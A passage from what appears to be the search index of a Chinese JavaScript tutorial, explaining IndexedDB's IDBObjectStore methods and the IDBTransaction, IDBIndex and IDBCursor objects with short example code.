<p>\uff081\uff09IDBObjectStore.add()</p> <p><code>IDBObjectStore.add()</code>\u7528\u4e8e\u5411\u5bf9\u8c61\u4ed3\u5e93\u6dfb\u52a0\u6570\u636e\uff0c\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u8be5\u65b9\u6cd5\u53ea\u7528\u4e8e\u6dfb\u52a0\u6570\u636e\uff0c\u5982\u679c\u4e3b\u952e\u76f8\u540c\u4f1a\u62a5\u9519\uff0c\u56e0\u6b64\u66f4\u65b0\u6570\u636e\u5fc5\u987b\u4f7f\u7528<code>put()</code>\u65b9\u6cd5\u3002</p> <pre><code>objectStore.add(value, key)\n</code></pre> <p>\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u952e\u503c\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e3b\u952e\uff0c\u8be5\u53c2\u6570\u53ef\u9009\uff0c\u5982\u679c\u7701\u7565\u9ed8\u8ba4\u4e3a<code>null</code>\u3002</p> <p>\u521b\u5efa\u4e8b\u52a1\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6\u5bf9\u8c61\u4ed3\u5e93\uff0c\u7136\u540e\u4f7f\u7528<code>add()</code>\u65b9\u6cd5\u5f80\u91cc\u9762\u6dfb\u52a0\u6570\u636e\u4e86\u3002</p> <pre><code>var db;\nvar DBOpenRequest = window.indexedDB.open('demo', 1);\n\nDBOpenRequest.onsuccess = function (event) {\n  db = DBOpenRequest.result;\n  var transaction = db.transaction(['items'], 'readwrite');\n\n  transaction.oncomplete = function (event) {\n    console.log('transaction success');\n  };\n\n  transaction.onerror = function (event) {\n    console.log('transaction error: ' + transaction.error);\n  };\n\n  var objectStore = transaction.objectStore('items');\n  var objectStoreRequest = objectStore.add({ foo: 1 });\n\n  objectStoreRequest.onsuccess = function (event) {\n    console.log('add data success');\n  };\n\n};\n</code></pre> <p>\uff082\uff09IDBObjectStore.put()</p> <p><code>IDBObjectStore.put()</code>\u65b9\u6cd5\u7528\u4e8e\u66f4\u65b0\u67d0\u4e2a\u4e3b\u952e\u5bf9\u5e94\u7684\u6570\u636e\u8bb0\u5f55\uff0c\u5982\u679c\u5bf9\u5e94\u7684\u952e\u503c\u4e0d\u5b58\u5728\uff0c\u5219\u63d2\u5165\u4e00\u6761\u65b0\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002</p> <pre><code>objectStore.put(item, key)\n</code></pre> <p>\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u65b0\u6570\u636e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u4e3b\u952e\uff0c\u8be5\u53c2\u6570\u53ef\u9009\uff0c\u4e14\u53ea\u5728\u81ea\u52a8\u9012\u589e\u65f6\u624d\u6709\u5fc5\u8981\u63d0\u4f9b\uff0c\u56e0\u4e3a\u90a3\u65f6\u4e3b\u952e\u4e0d\u5305\u542b\u5728\u6570\u636e\u503c\u91cc\u9762\u3002</p> <p>\uff083\uff09IDBObjectStore.clear()</p> <p><code>IDBObjectStore.clear()</code>\u5220\u9664\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u6240\u6709\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002</p> <pre><code>objectStore.clear()\n</code></pre> <p>\u8be5\u65b9\u6cd5\u4e0d\u9700\u8981\u53c2\u6570\u3002</p> <p>\uff084\uff09IDBObjectStore.delete()</p> <p><code>IDBObjectStore.delete()</code>\u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u6307\u5b9a\u4e3b\u952e\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002</p> <pre><code>objectStore.delete(Key)\n</code></pre> <p>\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u4e3b\u952e\u7684\u503c\u3002</p> <p>\uff085\uff09IDBObjectStore.count()</p> <p><code>IDBObjectStore.count()</code>\u65b9\u6cd5\u7528\u4e8e\u8ba1\u7b97\u8bb0\u5f55\u7684\u6570\u91cf\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002</p> <pre><code>IDBObjectStore.count(key)\n</code></pre> <p>\u4e0d\u5e26\u53c2\u6570\u65f6\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u6240\u6709\u8bb0\u5f55\u6570\u91cf\u3002\u5982\u679c\u4e3b\u952e\u6216 IDBKeyRange \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u5219\u8fd4\u56de\u5bf9\u5e94\u7684\u8bb0\u5f55\u6570\u91cf\u3002</p> <p>\uff086\uff09IDBObjectStore.getKey()</p> <p><code>IDBObjectStore.getKey()</code>\u7528\u4e8e\u83b7\u53d6\u4e3b\u952e\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002</p> <pre><code>objectStore.getKey(key)\n</code></pre> <p>\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u53ef\u4ee5\u662f\u4e3b\u952e\u503c\u6216 IDBKeyRange \u5bf9\u8c61\u3002</p> <p>\uff087\uff09IDBObjectStore.get()</p> <p><code>IDBObjectStore.get()</code>\u7528\u4e8e\u83b7\u53d6\u4e3b\u952e\u5bf9\u5e94\u7684\u6570\u636e\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002</p> <pre><code>objectStore.get(key)\n</code></pre> <p>\uff088\uff09IDBObjectStore.getAll()</p> <p><code>DBObjectStore.getAll()</code>\u7528\u4e8e\u83b7\u53d6\u5bf9\u8c61\u4ed3\u5e93\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002</p> <pre><code>// \u83b7\u53d6\u6240\u6709\u8bb0\u5f55\nobjectStore.getAll()\n\n// \u83b7\u53d6\u6240\u6709\u7b26\u5408\u6307\u5b9a\u4e3b\u952e\u6216 IDBKeyRange \u7684\u8bb0\u5f55\nobjectStore.getAll(query)\n\n// \u6307\u5b9a\u83b7\u53d6\u8bb0\u5f55\u7684\u6570\u91cf\nobjectStore.getAll(query, count)\n</code></pre> <p>\uff089\uff09IDBObjectStore.getAllKeys()</p> <p><code>IDBObjectStore.getAllKeys()</code>\u7528\u4e8e\u83b7\u53d6\u6240\u6709\u7b26\u5408\u6761\u4ef6\u7684\u4e3b\u952e\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002</p> <pre><code>// \u83b7\u53d6\u6240\u6709\u8bb0\u5f55\u7684\u4e3b\u952e\nobjectStore.getAllKeys()\n\n// \u83b7\u53d6\u6240\u6709\u7b26\u5408\u6761\u4ef6\u7684\u4e3b\u952e\nobjectStore.getAllKeys(query)\n\n// \u6307\u5b9a\u83b7\u53d6\u4e3b\u952e\u7684\u6570\u91cf\nobjectStore.getAllKeys(query, count)\n</code></pre> <p>\uff0810\uff09IDBObjectStore.index()</p> <p><code>IDBObjectStore.index()</code>\u65b9\u6cd5\u8fd4\u56de\u6307\u5b9a\u540d\u79f0\u7684\u7d22\u5f15\u5bf9\u8c61 IDBIndex\u3002</p> <pre><code>objectStore.index(name)\n</code></pre> <p>\u6709\u4e86\u7d22\u5f15\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u9488\u5bf9\u7d22\u5f15\u6240\u5728\u7684\u5c5e\u6027\u8bfb\u53d6\u6570\u636e\u3002</p> <pre><code>var t = db.transaction(['people'], 'readonly');\nvar store = t.objectStore('people');\nvar index = store.index('name');\n\nvar request = index.get('foo');\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6253\u5f00\u5bf9\u8c61\u4ed3\u5e93\u4ee5\u540e\uff0c\u5148\u7528<code>index()</code>\u65b9\u6cd5\u6307\u5b9a\u83b7\u53d6<code>name</code>\u5c5e\u6027\u7684\u7d22\u5f15\uff0c\u7136\u540e\u7528<code>get()</code>\u65b9\u6cd5\u8bfb\u53d6\u67d0\u4e2a<code>name</code>\u5c5e\u6027(<code>foo</code>)\u5bf9\u5e94\u7684\u6570\u636e\u3002\u5982\u679c<code>name</code>\u5c5e\u6027\u4e0d\u662f\u5bf9\u5e94\u552f\u4e00\u503c\uff0c\u8fd9\u65f6<code>get()</code>\u65b9\u6cd5\u6709\u53ef\u80fd\u53d6\u56de\u591a\u4e2a\u6570\u636e\u5bf9\u8c61\u3002\u53e6\u5916\uff0c<code>get()</code>\u662f\u5f02\u6b65\u65b9\u6cd5\uff0c\u8bfb\u53d6\u6210\u529f\u4ee5\u540e\uff0c\u53ea\u80fd\u5728<code>success</code>\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\u5904\u7406\u6570\u636e\u3002</p> <p>\uff0811\uff09IDBObjectStore.createIndex()</p> <p><code>IDBObjectStore.createIndex()</code>\u65b9\u6cd5\u7528\u4e8e\u65b0\u5efa\u5f53\u524d\u6570\u636e\u5e93\u7684\u4e00\u4e2a\u7d22\u5f15\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728<code>VersionChange</code>\u76d1\u542c\u51fd\u6570\u91cc\u9762\u8c03\u7528\u3002</p> <pre><code>objectStore.createIndex(indexName, keyPath, objectParameters)\n</code></pre> <p>\u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002</p> <ul> <li>indexName\uff1a\u7d22\u5f15\u540d</li> <li>keyPath\uff1a\u4e3b\u952e</li> <li>objectParameters\uff1a\u914d\u7f6e\u5bf9\u8c61\uff08\u53ef\u9009\uff09</li> </ul> <p>\u7b2c\u4e09\u4e2a\u53c2\u6570\u53ef\u4ee5\u914d\u7f6e\u4ee5\u4e0b\u5c5e\u6027\u3002</p> <ul> <li>unique\uff1a\u5982\u679c\u8bbe\u4e3a<code>true</code>\uff0c\u5c06\u4e0d\u5141\u8bb8\u91cd\u590d\u7684\u503c</li> <li>multiEntry\uff1a\u5982\u679c\u8bbe\u4e3a<code>true</code>\uff0c\u5bf9\u4e8e\u6709\u591a\u4e2a\u503c\u7684\u4e3b\u952e\u6570\u7ec4\uff0c\u6bcf\u4e2a\u503c\u5c06\u5728\u7d22\u5f15\u91cc\u9762\u65b0\u5efa\u4e00\u4e2a\u6761\u76ee\uff0c\u5426\u5219\u4e3b\u952e\u6570\u7ec4\u5bf9\u5e94\u4e00\u4e2a\u6761\u76ee\u3002</li> </ul> <p>\u5047\u5b9a\u5bf9\u8c61\u4ed3\u5e93\u4e2d\u7684\u6570\u636e\u8bb0\u5f55\u90fd\u662f\u5982\u4e0b\u7684<code>person</code>\u7c7b\u578b\u3002</p> <pre><code>var person = {\n  name: name,\n  email: email,\n  created: new Date()\n};\n</code></pre> <p>\u53ef\u4ee5\u6307\u5b9a\u8fd9\u4e2a\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u6765\u5efa\u7acb\u7d22\u5f15\u3002</p> <pre><code>var store = db.createObjectStore('people', { autoIncrement: true });\n\nstore.createIndex('name', 'name', { unique: false });\nstore.createIndex('email', 'email', { unique: true });\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u544a\u8bc9\u7d22\u5f15\u5bf9\u8c61\uff0c<code>name</code>\u5c5e\u6027\u4e0d\u662f\u552f\u4e00\u503c\uff0c<code>email</code>\u5c5e\u6027\u662f\u552f\u4e00\u503c\u3002</p> <p>\uff0812\uff09IDBObjectStore.deleteIndex()</p> <p><code>IDBObjectStore.deleteIndex()</code>\u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u6307\u5b9a\u7684\u7d22\u5f15\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728<code>VersionChange</code>\u76d1\u542c\u51fd\u6570\u91cc\u9762\u8c03\u7528\u3002</p> <pre><code>objectStore.deleteIndex(indexName)\n</code></pre> <p>\uff0813\uff09IDBObjectStore.openCursor()</p> <p><code>IDBObjectStore.openCursor()</code>\u7528\u4e8e\u83b7\u53d6\u4e00\u4e2a\u6307\u9488\u5bf9\u8c61\u3002</p> <pre><code>IDBObjectStore.openCursor()\n</code></pre> <p>\u6307\u9488\u5bf9\u8c61\u53ef\u4ee5\u7528\u6765\u904d\u5386\u6570\u636e\u3002\u8be5\u5bf9\u8c61\u4e5f\u662f\u5f02\u6b65\u7684\uff0c\u6709\u81ea\u5df1\u7684<code>success</code>\u548c<code>error</code>\u4e8b\u4ef6\uff0c\u53ef\u4ee5\u5bf9\u5b83\u4eec\u6307\u5b9a\u76d1\u542c\u51fd\u6570\u3002</p> <pre><code>var t = db.transaction(['test'], 'readonly');\nvar store = t.objectStore('test');\n\nvar cursor = store.openCursor();\n\ncursor.onsuccess = function (event) {\n  var res = event.target.result;\n  if (res) {\n    console.log('Key', res.key);\n    console.dir('Data', res.value);\n    res.continue();\n  }\n}\n</code></pre> <p>\u76d1\u542c\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be5\u5bf9\u8c61\u7684<code>target.result</code>\u5c5e\u6027\u6307\u5411\u5f53\u524d\u6570\u636e\u8bb0\u5f55\u3002\u8be5\u8bb0\u5f55\u7684<code>key</code>\u548c<code>value</code>\u5206\u522b\u8fd4\u56de\u4e3b\u952e\u548c\u952e\u503c\uff08\u5373\u5b9e\u9645\u5b58\u5165\u7684\u6570\u636e\uff09\u3002<code>continue()</code>\u65b9\u6cd5\u5c06\u5149\u6807\u79fb\u5230\u4e0b\u4e00\u4e2a\u6570\u636e\u5bf9\u8c61\uff0c\u5982\u679c\u5f53\u524d\u6570\u636e\u5bf9\u8c61\u5df2\u7ecf\u662f\u6700\u540e\u4e00\u4e2a\u6570\u636e\u4e86\uff0c\u5219\u5149\u6807\u6307\u5411<code>null</code>\u3002</p> <p><code>openCursor()</code>\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e3b\u952e\u503c\uff0c\u6216\u8005\u4e00\u4e2a IDBKeyRange \u5bf9\u8c61\u3002\u5982\u679c\u6307\u5b9a\u8be5\u53c2\u6570\uff0c\u5c06\u53ea\u5904\u7406\u5305\u542b\u6307\u5b9a\u4e3b\u952e\u7684\u8bb0\u5f55\uff1b\u5982\u679c\u7701\u7565\uff0c\u5c06\u5904\u7406\u6240\u6709\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u904d\u5386\u65b9\u5411\uff0c\u9ed8\u8ba4\u503c\u4e3a<code>next</code>\uff0c\u5176\u4ed6\u53ef\u80fd\u7684\u503c\u4e3a<code>prev</code>\u3001<code>nextunique</code>\u548c<code>prevunique</code>\u3002\u540e\u4e24\u4e2a\u503c\u8868\u793a\u5982\u679c\u9047\u5230\u91cd\u590d\u503c\uff0c\u4f1a\u81ea\u52a8\u8df3\u8fc7\u3002</p> <p>\uff0814\uff09IDBObjectStore.openKeyCursor()</p> <p><code>IDBObjectStore.openKeyCursor()</code>\u7528\u4e8e\u83b7\u53d6\u4e00\u4e2a\u4e3b\u952e\u6307\u9488\u5bf9\u8c61\u3002</p> <pre><code>IDBObjectStore.openKeyCursor()\n</code></pre>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#idb-transaction","title":"IDB Transaction \u5bf9\u8c61","text":"<p>IDBTransaction \u5bf9\u8c61\u7528\u6765\u5f02\u6b65\u64cd\u4f5c\u6570\u636e\u5e93\u4e8b\u52a1\uff0c\u6240\u6709\u7684\u8bfb\u5199\u64cd\u4f5c\u90fd\u8981\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u8fdb\u884c\u3002</p> <p><code>IDBDatabase.transaction()</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f\u4e00\u4e2a IDBTransaction \u5bf9\u8c61\u3002</p> <pre><code>var db;\nvar DBOpenRequest = window.indexedDB.open('demo', 1);\n\nDBOpenRequest.onsuccess = function(event) {\n  db = DBOpenRequest.result;\n  var transaction = db.transaction(['demo'], 'readwrite');\n\n  transaction.oncomplete = function (event) {\n    console.log('transaction success');\n  };\n\n  transaction.onerror = function (event) {\n    console.log('transaction error: ' + transaction.error);\n  };\n\n  var objectStore = transaction.objectStore('demo');\n  var objectStoreRequest = objectStore.add({ foo: 1 });\n\n  objectStoreRequest.onsuccess = function (event) {\n    console.log('add data success');\n  };\n\n};\n</code></pre> <p>\u4e8b\u52a1\u7684\u6267\u884c\u987a\u5e8f\u662f\u6309\u7167\u521b\u5efa\u7684\u987a\u5e8f\uff0c\u800c\u4e0d\u662f\u53d1\u51fa\u8bf7\u6c42\u7684\u987a\u5e8f\u3002</p> <pre><code>var trans1 = db.transaction('foo', 'readwrite');\nvar trans2 = db.transaction('foo', 'readwrite');\nvar objectStore2 = trans2.objectStore('foo')\nvar objectStore1 = trans1.objectStore('foo')\nobjectStore2.put('2', 'key');\nobjectStore1.put('1', 'key');\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>key</code>\u5bf9\u5e94\u7684\u952e\u503c\u6700\u7ec8\u662f<code>2</code>\uff0c\u800c\u4e0d\u662f<code>1</code>\u3002\u56e0\u4e3a\u4e8b\u52a1<code>trans1</code>\u5148\u4e8e<code>trans2</code>\u521b\u5efa\uff0c\u6240\u4ee5\u9996\u5148\u6267\u884c\u3002</p> <p>\u6ce8\u610f\uff0c\u4e8b\u52a1\u6709\u53ef\u80fd\u5931\u8d25\uff0c\u53ea\u6709\u76d1\u542c\u5230\u4e8b\u52a1\u7684<code>complete</code>\u4e8b\u4ef6\uff0c\u624d\u80fd\u4fdd\u8bc1\u4e8b\u52a1\u64cd\u4f5c\u6210\u529f\u3002</p> <p>IDBTransaction \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002</p> <ul> <li><code>IDBTransaction.db</code>\uff1a\u8fd4\u56de\u5f53\u524d\u4e8b\u52a1\u6240\u5728\u7684\u6570\u636e\u5e93\u5bf9\u8c61 IDBDatabase\u3002</li> <li><code>IDBTransaction.error</code>\uff1a\u8fd4\u56de\u5f53\u524d\u4e8b\u52a1\u7684\u9519\u8bef\u3002\u5982\u679c\u4e8b\u52a1\u6ca1\u6709\u7ed3\u675f\uff0c\u6216\u8005\u4e8b\u52a1\u6210\u529f\u7ed3\u675f\uff0c\u6216\u8005\u88ab\u624b\u52a8\u7ec8\u6b62\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de<code>null</code>\u3002</li> <li><code>IDBTransaction.mode</code>\uff1a\u8fd4\u56de\u5f53\u524d\u4e8b\u52a1\u7684\u6a21\u5f0f\uff0c\u9ed8\u8ba4\u662f<code>readonly</code>\uff08\u53ea\u8bfb\uff09\uff0c\u53e6\u4e00\u4e2a\u503c\u662f<code>readwrite</code>\u3002</li> <li><code>IDBTransaction.objectStoreNames</code>\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61 DOMStringList\uff0c\u6210\u5458\u662f\u5f53\u524d\u4e8b\u52a1\u6d89\u53ca\u7684\u5bf9\u8c61\u4ed3\u5e93\u7684\u540d\u5b57\u3002</li> <li><code>IDBTransaction.onabort</code>\uff1a\u6307\u5b9a<code>abort</code>\u4e8b\u4ef6\uff08\u4e8b\u52a1\u4e2d\u65ad\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002</li> <li><code>IDBTransaction.oncomplete</code>\uff1a\u6307\u5b9a<code>complete</code>\u4e8b\u4ef6\uff08\u4e8b\u52a1\u6210\u529f\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002</li> <li><code>IDBTransaction.onerror</code>\uff1a\u6307\u5b9a<code>error</code>\u4e8b\u4ef6\uff08\u4e8b\u52a1\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002</li> </ul> <p>IDBTransaction \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\u3002</p> <ul> <li><code>IDBTransaction.abort()</code>\uff1a\u7ec8\u6b62\u5f53\u524d\u4e8b\u52a1\uff0c\u56de\u6eda\u6240\u6709\u5df2\u7ecf\u8fdb\u884c\u7684\u53d8\u66f4\u3002</li> <li><code>IDBTransaction.objectStore(name)</code>\uff1a\u8fd4\u56de\u6307\u5b9a\u540d\u79f0\u7684\u5bf9\u8c61\u4ed3\u5e93 IDBObjectStore\u3002</li> </ul>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#idbindex","title":"IDBIndex \u5bf9\u8c61","text":"<p>IDBIndex \u5bf9\u8c61\u4ee3\u8868\u6570\u636e\u5e93\u7684\u7d22\u5f15\uff0c\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u83b7\u53d6\u6570\u636e\u5e93\u91cc\u9762\u7684\u8bb0\u5f55\u3002\u6570\u636e\u8bb0\u5f55\u7684\u4e3b\u952e\u9ed8\u8ba4\u5c31\u662f\u5e26\u6709\u7d22\u5f15\uff0cIDBIndex \u5bf9\u8c61\u4e3b\u8981\u7528\u4e8e\u901a\u8fc7\u9664\u4e3b\u952e\u4ee5\u5916\u7684\u5176\u4ed6\u952e\uff0c\u5efa\u7acb\u7d22\u5f15\u83b7\u53d6\u5bf9\u8c61\u3002</p> <p>IDBIndex \u662f\u6301\u4e45\u6027\u7684\u952e\u503c\u5bf9\u5b58\u50a8\u3002\u53ea\u8981\u63d2\u5165\u3001\u66f4\u65b0\u6216\u5220\u9664\u6570\u636e\u8bb0\u5f55\uff0c\u5f15\u7528\u7684\u5bf9\u8c61\u5e93\u4e2d\u7684\u8bb0\u5f55\uff0c\u7d22\u5f15\u5c31\u4f1a\u81ea\u52a8\u66f4\u65b0\u3002</p> <p><code>IDBObjectStore.index()</code>\u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6 IDBIndex \u5bf9\u8c61\u3002</p> <pre><code>var transaction = db.transaction(['contactsList'], 'readonly');\nvar objectStore = transaction.objectStore('contactsList');\nvar myIndex = objectStore.index('lName');\n\nmyIndex.openCursor().onsuccess = function (event) {\n  var cursor = event.target.result;\n  if (cursor) {\n    var tableRow = document.createElement('tr');\n    tableRow.innerHTML =   '&lt;td&gt;' + cursor.value.id + '&lt;/td&gt;'\n                         + '&lt;td&gt;' + cursor.value.lName + '&lt;/td&gt;'\n                         + '&lt;td&gt;' + cursor.value.fName + '&lt;/td&gt;'\n                         + '&lt;td&gt;' + cursor.value.jTitle + '&lt;/td&gt;'\n                         + '&lt;td&gt;' + cursor.value.company + '&lt;/td&gt;'\n                         + '&lt;td&gt;' + cursor.value.eMail + '&lt;/td&gt;'\n                         + '&lt;td&gt;' + cursor.value.phone + '&lt;/td&gt;'\n                         + '&lt;td&gt;' + cursor.value.age + '&lt;/td&gt;';\n    tableEntry.appendChild(tableRow);\n\n    cursor.continue();\n  } else {\n    console.log('Entries all displayed.');\n  }\n};\n</code></pre> <p>IDBIndex \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002</p> <ul> <li><code>IDBIndex.name</code>\uff1a\u5b57\u7b26\u4e32\uff0c\u7d22\u5f15\u7684\u540d\u79f0\u3002</li> <li><code>IDBIndex.objectStore</code>\uff1a\u7d22\u5f15\u6240\u5728\u7684\u5bf9\u8c61\u4ed3\u5e93\u3002</li> <li><code>IDBIndex.keyPath</code>\uff1a\u7d22\u5f15\u7684\u4e3b\u952e\u3002</li> <li><code>IDBIndex.multiEntry</code>\uff1a\u5e03\u5c14\u503c\uff0c\u9488\u5bf9<code>keyPath</code>\u4e3a\u6570\u7ec4\u7684\u60c5\u51b5\uff0c\u5982\u679c\u8bbe\u4e3a<code>true</code>\uff0c\u521b\u5efa\u6570\u7ec4\u65f6\uff0c\u6bcf\u4e2a\u6570\u7ec4\u6210\u5458\u90fd\u4f1a\u6709\u4e00\u4e2a\u6761\u76ee\uff0c\u5426\u5219\u6bcf\u4e2a\u6570\u7ec4\u90fd\u53ea\u6709\u4e00\u4e2a\u6761\u76ee\u3002</li> <li><code>IDBIndex.unique</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u521b\u5efa\u7d22\u5f15\u65f6\u662f\u5426\u5141\u8bb8\u76f8\u540c\u7684\u4e3b\u952e\u3002</li> </ul> <p>IDBIndex \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\uff0c\u5b83\u4eec\u90fd\u662f\u5f02\u6b65\u7684\uff0c\u7acb\u5373\u8fd4\u56de\u7684\u90fd\u662f\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002</p> <ul> <li><code>IDBIndex.count()</code>\uff1a\u7528\u6765\u83b7\u53d6\u8bb0\u5f55\u7684\u6570\u91cf\u3002\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e3b\u952e\u6216 IDBKeyRange \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd9\u65f6\u53ea\u8fd4\u56de\u7b26\u5408\u4e3b\u952e\u7684\u8bb0\u5f55\u6570\u91cf\uff0c\u5426\u5219\u8fd4\u56de\u6240\u6709\u8bb0\u5f55\u7684\u6570\u91cf\u3002</li> <li><code>IDBIndex.get(key)</code>\uff1a\u7528\u6765\u83b7\u53d6\u7b26\u5408\u6307\u5b9a\u4e3b\u952e\u7684\u6570\u636e\u8bb0\u5f55\u3002</li> <li><code>IDBIndex.getKey(key)</code>\uff1a\u7528\u6765\u83b7\u53d6\u6307\u5b9a\u7684\u4e3b\u952e\u3002</li> <li><code>IDBIndex.getAll()</code>\uff1a\u7528\u6765\u83b7\u53d6\u6240\u6709\u7684\u6570\u636e\u8bb0\u5f55\u3002\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u90fd\u662f\u53ef\u9009\u7684\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u7528\u6765\u6307\u5b9a\u4e3b\u952e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7528\u6765\u6307\u5b9a\u8fd4\u56de\u8bb0\u5f55\u7684\u6570\u91cf\u3002\u5982\u679c\u7701\u7565\u8fd9\u4e24\u4e2a\u53c2\u6570\uff0c\u5219\u8fd4\u56de\u6240\u6709\u8bb0\u5f55\u3002\u7531\u4e8e\u83b7\u53d6\u6210\u529f\u65f6\uff0c\u6d4f\u89c8\u5668\u5fc5\u987b\u751f\u6210\u6240\u6709\u5bf9\u8c61\uff0c\u6240\u4ee5\u5bf9\u6027\u80fd\u6709\u5f71\u54cd\u3002\u5982\u679c\u6570\u636e\u96c6\u6bd4\u8f83\u5927\uff0c\u5efa\u8bae\u4f7f\u7528 IDBCursor \u5bf9\u8c61\u3002</li> <li><code>IDBIndex.getAllKeys()</code>\uff1a\u8be5\u65b9\u6cd5\u4e0e<code>IDBIndex.getAll()</code>\u65b9\u6cd5\u76f8\u4f3c\uff0c\u533a\u522b\u662f\u83b7\u53d6\u6240\u6709\u4e3b\u952e\u3002</li> <li><code>IDBIndex.openCursor()</code>\uff1a\u7528\u6765\u83b7\u53d6\u4e00\u4e2a IDBCursor \u5bf9\u8c61\uff0c\u7528\u6765\u904d\u5386\u7d22\u5f15\u91cc\u9762\u7684\u6240\u6709\u6761\u76ee\u3002</li> <li><code>IDBIndex.openKeyCursor()</code>\uff1a\u8be5\u65b9\u6cd5\u4e0e<code>IDBIndex.openCursor()</code>\u65b9\u6cd5\u76f8\u4f3c\uff0c\u533a\u522b\u662f\u904d\u5386\u6240\u6709\u6761\u76ee\u7684\u4e3b\u952e\u3002</li> </ul>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#idbcursor","title":"IDBCursor \u5bf9\u8c61","text":"<p>IDBCursor \u5bf9\u8c61\u4ee3\u8868\u6307\u9488\u5bf9\u8c61\uff0c\u7528\u6765\u904d\u5386\u6570\u636e\u4ed3\u5e93\uff08IDBObjectStore\uff09\u6216\u7d22\u5f15\uff08IDBIndex\uff09\u7684\u8bb0\u5f55\u3002</p> <p>IDBCursor \u5bf9\u8c61\u4e00\u822c\u901a\u8fc7<code>IDBObjectStore.openCursor()</code>\u65b9\u6cd5\u83b7\u5f97\u3002</p> <pre><code>var transaction = db.transaction(['rushAlbumList'], 'readonly');\nvar objectStore = transaction.objectStore('rushAlbumList');\n\nobjectStore.openCursor(null, 'next').onsuccess = function(event) {\n  var cursor = event.target.result;\n  if (cursor) {\n    var listItem = document.createElement('li');\n      listItem.innerHTML = cursor.value.albumTitle + ', ' + cursor.value.year;\n      list.appendChild(listItem);\n\n      console.log(cursor.source);\n      cursor.continue();\n    } else {\n      console.log('Entries all displayed.');\n    }\n  };\n};\n</code></pre> <p>IDBCursor \u5bf9\u8c61\u7684\u5c5e\u6027\u3002</p> <ul> 